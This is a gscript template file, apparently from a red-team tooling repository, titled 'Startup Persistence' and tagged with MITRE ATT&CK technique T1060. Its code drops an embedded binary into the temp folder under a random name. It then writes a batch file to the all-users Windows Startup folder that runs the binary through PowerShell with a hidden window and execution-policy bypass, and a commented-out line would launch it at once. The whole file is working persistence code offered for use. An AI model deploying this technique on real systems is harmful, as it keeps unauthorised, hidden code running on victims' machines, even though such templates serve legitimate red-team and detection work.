// Example gscript template
// Title: Startup Persistence
// Author: ahhh
// Purpose: Drop a sample binary and persist it using a script in the Startup folder
// Gscript version: 1.0.0
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1060

//priority:90
//timeout:150
//import:/private/tmp/example.exe
//go_import:os as os

function Deploy() {
  console.log("starting execution of Startup Persistence");

  // Prep the sample
  var example = GetAssetAsBytes("example.exe");
  var temppath = os.TempDir();
  var naming = G.rand.GetAlphaString(5);
  naming = naming.toLowerCase();
  var fullpath = temppath+"\\"+naming+".exe";

  // Drop the sample
  console.log("file name: "+ fullpath);
  errors = G.file.WriteFileFromBytes(fullpath, example[0]);
  console.log("errors: "+errors);
  
  // Persist the sample
  var cmd = "powershell.exe -NoLogo -WindowStyle hidden -ep bypass " + fullpath;
  var fn2 = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\start.bat";
  G.file.WriteFileFromString(fn2, cmd);
  console.log("persisted the example binary using bat / powershell script in StartUp folder");

  // Execute the sample
  //var running = G.exec.ExecuteCommandAsync("powershell", ["-NoLogo", "-WindowStyle", "hidden", "-ep", "bypass", fn]);
  //console.log("executed the example binary, errors: "+running[1]);

  console.log("done, deployed binary with startup persistence");
  return true;
}
